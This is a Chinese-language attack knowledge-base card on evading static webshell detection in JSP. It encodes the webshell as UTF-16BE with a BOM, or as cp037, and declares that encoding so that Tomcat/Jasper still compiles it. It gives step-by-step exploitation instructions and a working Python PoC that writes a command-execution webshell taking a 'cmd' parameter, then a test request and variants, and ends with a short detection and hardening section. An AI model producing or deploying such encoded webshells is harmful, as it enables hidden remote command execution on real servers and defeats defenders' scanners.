---
id: web-java-rce-jsp-pageencoding-static-detection-bypass
title: JSP pageEncoding/contentType 指定非 UTF-8 编码绕过静态 webshell 检测
type: scenario
domain: web
path: web/java/rce
technique: jsp-pageencoding-static-detection-bypass
tags:
- java
- jsp
- webshell
- waf-bypass
- encoding
- utf-16
- tomcat
- jasper
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:45:32+08:00'
  notes: 已对照原文与图03/04/05/06核对：图03 为 cp037 XML prolog 的乱码 JSP，图04 访问 ?cmd=ping 执行成功，图05 阿里云检测判为正常，图06 setupContextWriter 使用 javaEncoding。原文只给编码思路与截图，未给完整文件生成步骤；卡以 UTF-16BE+BOM 为主例、cp037 为变体，并已标 confidence=medium。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/rce/web-java-rce-jsp-pageencoding-static-detection-bypass/
draft: false
kb_aliases:
- JSP 编码免杀
- pageEncoding 绕过 WAF
- UTF-16BE webshell
- cp037 JSP
- JSP 源码编码绕过
---

## 一句话结论

Jasper 会按 JSP 中声明的 `pageEncoding`、`contentType` charset、BOM 或 XML prolog 来解码源文件；把整个 webshell 以 UTF-16BE（带 BOM）或其它非常见编码保存，并在指令/XML prolog 中声明该编码，容器能正确编译执行，而只按 UTF-8/ASCII 解析的静态检测器看到的是 NUL/乱码，关键字匹配失效。

## 原理

- JSP 源文件需要先按某种字符集解码成 Unicode，Jasper 才能解析 `<% %>` 和指令。`ParserController.determineSyntaxAndEncoding()` 的优先级大致是：BOM → `pageEncoding` → `contentType` 中的 charset → XML prolog 编码 → 默认 ISO-8859-1。
- `getPageEncodingForJspSyntax()` 会扫描 `<%@ page pageEncoding="..." %>`、`<%@ page contentType="...;charset=..." %>` 或 `<jsp:directive.page .../>` 取得编码；若文件带 UTF-16 BOM，则直接按 UTF-16 解码。随后 `setupContextWriter()` 用 `options.getJavaEncoding()` 生成 Java。
- 因为容器按声明编码解码，攻击者可以把完整 webshell 用 UTF-16BE/cp037 等编码保存；容器解码后看到的仍是正常的 JSP 代码，照常编译执行。
- 静态检测器若固定按 UTF-8/ASCII 读取文件（或只做字节级正则），会把 UTF-16 的 NUL 字节、cp037 的非 ASCII 字节视为乱码，无法匹配 `Runtime`、`exec`、`request` 等关键字；即使检测器支持 UTF-8，也不会自动按 JSP 声明切换编码。
- 该技巧不改变利用语义，只改变“文件字节表示”；一旦检测器按 BOM/声明编码解码并归一化为 Unicode，绕过即失效。

## 触发条件

- 目标使用 Tomcat/Jasper 或兼容 JSP 容器，能正确识别 `pageEncoding`/BOM/XML prolog。
- 攻击者能上传/写入 JSP 文件，并能控制文件字节（不是只能通过文本表单粘贴）。
- 静态检测器未按声明编码解码，或只做字节级关键字匹配。
- 选择的编码必须被容器支持（UTF-16BE/BOM 最稳；cp037 等需要容器/JDK 支持且声明方式正确）。

## 利用步骤

1. 编写正常 JSP webshell 内容（如 `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`）。
2. 在页面指令中声明 `pageEncoding="UTF-16BE"`；若使用 XML 语法，可在 prolog 中写 `encoding="UTF-16BE"`。
3. 用该编码保存整个文件；UTF-16BE 建议加 BOM，便于 Jasper 在读取指令前识别编码。
4. 上传/写入 Web 目录，访问并传命令参数验证。
5. 若容器报编码/语法错误，检查实际字节与 BOM，确认声明的编码与文件编码一致。

## PoC

```python
# 生成一个 UTF-16BE + BOM 的 JSP
import codecs

jsp = '''<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-16BE" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'''

with open('test.jsp', 'wb') as f:
    f.write(codecs.BOM_UTF16_BE)
    f.write(jsp.encode('utf-16-be'))
```

```text
# 文件字节以 FE FF 开头（UTF-16BE BOM），后续为 UTF-16BE 编码的 JSP。
# Jasper 读取 BOM 后按 UTF-16BE 解码，正常编译执行。
# 按 UTF-8 读取的检测器会看到大量 00 字节/乱码，关键字不连续。
```

```text
# 访问：
GET /test/test.jsp?cmd=ping
# 成功执行并返回 ping 帮助/输出（原文用 ping 验证）。
```

```text
# 其他编码声明方式（原文）：
# 1) <%@ page language="java" pageEncoding="utf-16be" %>
# 2) <%@ page contentType="text/html;charset=utf-16be" %>
# 3) <jsp:directive.page pageEncoding="utf-16be"/>
# 4) XML prolog: <?xml version="1.0" encoding='cp037'?> + 以 cp037 编码正文
```

## 变体与关联

- 变体：UTF-16LE/BOM、UTF-32、cp037/EBCDIC 等；编码越冷门，检测器误判概率越高，但容器支持与声明方式也越苛刻。
- 变体：XML 语法 JSP（JSP Document/JSPX）用 `<?xml ... encoding='...'?>` 声明编码，正文按该编码保存。
- 变体：与 `trimDirectiveWhitespaces` 片段拼接、特殊闭合组合，形成编码层 + 语法层的双重绕过。
- 关联：[[web-java-rce-jsp-trim-whitespace-fragment-bypass]]（片段拼接绕过）；[[web-java-rce-jsp-scriptlet-special-closure-bypass]]（闭合结构绕过）。
- 边界：检测器按 BOM/声明解码后再扫描、容器不支持该编码、或上传通道强制转码为 UTF-8 时失效；cp037 等编码在标准 JSP 语法下的指令扫描可能失败，优先用 UTF-16BE+BOM 验证。本卡置信度 medium，因原文只给出编码思路与截图，未提供完整可复制的文件生成步骤。

## 检测与防御

- 检测：先按 BOM/`pageEncoding`/`contentType`/XML prolog 解码 JSP，再统一转 Unicode 做关键字与语法分析；对 NUL 字节、非常见编码、BOM 与声明不一致的文件告警。
- 修复：禁止上传/写入 JSP；上传目录不可执行；服务端只接受 UTF-8 文本并拒绝 BOM/非 UTF-8 编码的 JSP。
- 加固：WAF 与文件检测器使用与容器一致的编码解析逻辑；对 JSP 做编译后分析；监控 work 目录中新增的编译产物。
